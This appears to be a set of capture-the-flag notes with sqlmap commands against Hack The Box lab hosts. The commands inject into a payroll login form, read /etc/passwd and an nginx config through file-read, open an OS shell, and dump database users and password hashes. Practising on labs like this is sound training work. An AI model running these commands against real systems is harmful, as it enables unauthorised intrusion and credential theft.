```zsh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --
data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
```

we will use the technique flag in sqlmap to
instruct it to use specific techniques. sqlmap has the following techniques that can be set:
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

```bash
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data="username=admin&password=password" -p username --privileges --batch
```

```zsh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd

sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites-enabled/default
```

```zsh
sqlmap -u "http://10.129.95.174/dashboard.php?search=nbvbn" --os-shell

sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --users
sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --password
```
